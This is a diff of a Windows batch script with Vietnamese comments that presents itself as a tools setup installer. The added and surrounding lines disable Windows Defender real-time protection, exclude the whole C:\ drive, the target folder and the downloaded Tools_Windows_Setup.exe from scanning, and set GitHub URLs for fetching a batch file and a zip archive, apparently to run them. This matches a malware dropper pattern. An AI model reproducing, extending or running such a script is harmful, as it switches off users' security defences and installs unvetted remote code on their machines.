@@ -1,9 +1,3 @@
-start windowsdefender:
-powershell -NoP -Ep Bypass -C "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableIOAVProtection 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBehaviorMonitoring 1"
-
-
-
-
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
 
@@ -49,9 +43,14 @@ echo.
 :: TẮT TẠM THỜI DEFENDER (Win10+; Win7/8 try/catch)
 :: ========================
 echo Dang tat tam thoi Windows Defender Real-Time Protection...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
+
+rem --- Thêm ngoại lệ ---
+powershell -NoP -Ep Bypass -C ^
+ "Try { Add-MpPreference -ExclusionPath '%TARGETDIR%'; Add-MpPreference -ExclusionProcess '%FILE3%'; exit 0 } Catch { Write-Host $_.Exception.Message; exit 1 }"
+set RC=%ERRORLEVEL%
+
 echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc).
 echo.
 
@@ -65,6 +64,9 @@ set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
 set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
 set "EXE_7z_x64=%TEMP%\7z2301-x64.exe"
 set "EXE_7z_x32=%TEMP%\7z2301.exe"
+
+
+
 
 set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Update.bat"
 set "URL_ZIP=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.zip"
